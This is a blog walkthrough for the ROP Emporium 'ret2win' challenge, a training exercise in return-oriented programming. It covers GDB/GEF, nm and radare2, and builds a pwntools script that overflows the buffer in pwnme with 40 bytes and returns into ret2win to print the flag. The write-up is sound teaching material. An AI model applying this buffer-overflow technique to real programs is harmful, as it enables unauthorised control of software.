@@ -1,0 +1,171 @@
+<html>                             
+<head>
+<link rel="stylesheet" href="../style.css">
+</head>
+<body>
+<pre>
+
+<h1>ROP Emporium Pt. 1: ret2win</h1>
+<r>SPOILER WARNING: This page will contain potential spoilers, so consider that
+before continuing</r>
+
+<a href="https://ropemporium.com">ROP Emporium</a> is a collection of challenges designed to teach return-oriented 
+programming (ROP) techniques by slowly introducing new concepts and increasing 
+difficulty. If you're looking for a spoiler-free guide, check out the one 
+included on their <a href="https://ropemporium.com/guide.html">website</a>. 
+
+Thanks to advice from <a href="https://haunted.computer/@netspooky">@netspooky</a> on Mastodon, I installed <a href="https://hugsy.github.io/gef/">GDB with GEF</a> and 
+<a href="https://github.com/sashs/Ropper">Ropper</a> to get started.
+
+I also made use of their cheat sheet of GDB commands that they very kindly 
+guided me to:
+
+<a href="https://tmpout.sh/bggp/3/">https://tmpout.sh/bggp/3/</a>
+───────────────────────────────────────────────────────────────────────────────
+  [ gdb ]
+  - Can run or attach to a program currently running on Linux
+  - If you're new to gdb, use gef! https://github.com/hugsy/gef
+  - Here are some basic commands to get you started:
+
+    $ gdb --args ./myprogram -f myfile     -- Start the program with arguments
+    gef> starti                            -- Start at the first instruction
+    gef> stepi                             -- Step 1 assembly instruction
+    gef> break *0x400000                   -- Set a breakpoint on address 
+                                              0x400000
+    gef> continue                          -- Continue execution, will stop 
+                                              at breakpoints
+    gef> vmmap                             -- Check memory map
+    gef> hexdump byte --size 256 0x400000  -- See a hex dump of bytes at a 
+                                              address 0x400000
+    gef> p *object                         -- Show details of object
+    gef> search-pattern 0x41414141         -- Search for bytes \x41\x41\x41\x41 
+                                              ("AAAA") in memory
+
+  More Info:
+    <a href="https://hugsy.github.io/gef/">https://hugsy.github.io/gef/</a>
+    <a href="https://azeria-labs.com/debugging-with-gdb-introduction/">https://azeria-labs.com/debugging-with-gdb-introduction/</a>
+───────────────────────────────────────────────────────────────────────────────
+
+The first step in solving this is to simply read through the page for the 
+challenge, as it includes some good information.
+
+I found two hints to be particularly notable, the first being that “typically 
+you'll need 40 bytes of garbage to reach the saved return address in the 
+x86_64 binaries, 44 bytes in the x86 binaries and around 36 bytes in the ARMv5 
+& MIPS binaries”. For context, this means giving the program a string of text 
+N characters long before the payload in order to cause a buffer overflow and 
+starting writing into the return address. This same vulnerability is used 
+across all of the challenges on ROP Emporium. By doing this, you can modify the 
+program flow, which is the foundation of Return-Oriented Programming.
+
+The second was that you can “find out how many bytes you have to construct your 
+chain ... using `$ ltrace <binary>` and looking at the call to `read()`.” Doing 
+this gives us 56 bytes, which with the garbage characters, leaves 16 bytes for 
+a chain.
+
+Now I'll start actually poking around at the binary.
+
+I used this nm one-liner to list out the symbols in the file, filtering for 
+only the text section of data. Similar can be done with 'strings', or 
+'rabin2 -i'.
+
+nm
+──────────────────────────────────────────
+  $ nm ./ret2win | grep " t "
+
+  00000000004005f0 t deregister_tm_clones
+  0000000000400660 t __do_global_dtors_aux
+  0000000000400690 t frame_dummy
+  00000000004006e8 t pwnme
+  0000000000400620 t register_tm_clones
+  0000000000400756 t ret2win
+──────────────────────────────────────────
+
+Two symbols stand out here, which are pwnme (at 0x4006e8) and ret2win 
+(at 0x400756). By disassembling both, we can see that pwnme is the name of the 
+vulnerable function taking user input, and ret2win is the function printing out 
+the flag. The goal is to overflow pwnme and jump to ret2win.
+
+radare
+───────────────────────────────────────────────────────────────────────────────
+  [0x004006e8]> 0x400756
+  [0x00400756]> pdf
+              ;-- rip:
+  ┌ 27: sym.ret2win ();
+  │           0x00400756      55             push rbp
+  │           0x00400757      4889e5         mov rbp, rsp
+  │           0x0040075a      bf26094000     mov edi, 
+  │                                          str.Well_done__Heres_your_flag: 
+  │                                          ; 0x400926 ; "Well done! Here's 
+  │                                          your flag:" ; const char *s
+  │           0x0040075f      e8ecfdffff     call sym.imp.puts
+  │           0x00400764      bf43094000     mov edi, str._bin_cat_flag.txt
+  │                                          ; 0x400943 ; "/bin/cat flag.txt"
+  │           0x00400769      e8f2fdffff     call sym.imp.system    
+  │           0x0040076e      90             nop
+  │           0x0040076f      5d             pop rbp
+  └           0x00400770      c3             ret
+───────────────────────────────────────────────────────────────────────────────
+
+Learning from the <a href="https://docs.pwntools.com/en/latest/intro.html">pwntools wiki</a> (a Python library recommended by 
+the <a href="https://ropemporium.com/guide.html">Beginners' Guide</a>), I threw together the beginning of a script to interact 
+with the binary.
+
+exploit.py
+───────────────────────────
+  from pwn import *
+
+  p = process('./ret2win')
+
+  payload = b'A' * 40    
+
+  p.sendline(payload)
+  log.info(p.clean())
+───────────────────────────
+
+I also learned that pwntools offers yet another way to dump symbols from the 
+executable. It's not necessary in any capacity for this challenge but it makes 
+it possible to do some fun stuff.
+
+exploit.py
+────────────────────────────────────────────────────
+  e = ELF('./ret2win')
+  context(arch='amd64', os='linux', endian='little')
+  
+  print(e.symbols)
+────────────────────────────────────────────────────
+
+This allows, not only referencing hard-coded symbols but, also looking things 
+up at runtime and referencing them in a slightly more abstract way. For 
+example, 'e.symbols['ret2win']', instead of 0x400756.
+
+Here's one final solution that exemplifies both possible routes.
+
+exploit.py
+────────────────────────────────────────────────────
+  from pwn import *
+
+  p = process('./ret2win') 
+  e = ELF('./ret2win')
+  context(arch='amd64', os='linux', endian='little')
+  
+  payload = b'A' * 40
+  
+  # Hardcoded
+  # payload += p64(0x400756) 
+  
+  # Dynamic
+  payload += p64(e.symbols['ret2win'])
+  
+  print(payload)
+  
+  p.sendline(payload)
+  log.info(p.clean())
+────────────────────────────────────────────────────
+
+See part 2 for more.
+
+// END //
+</pre>
+</body>
+</html>
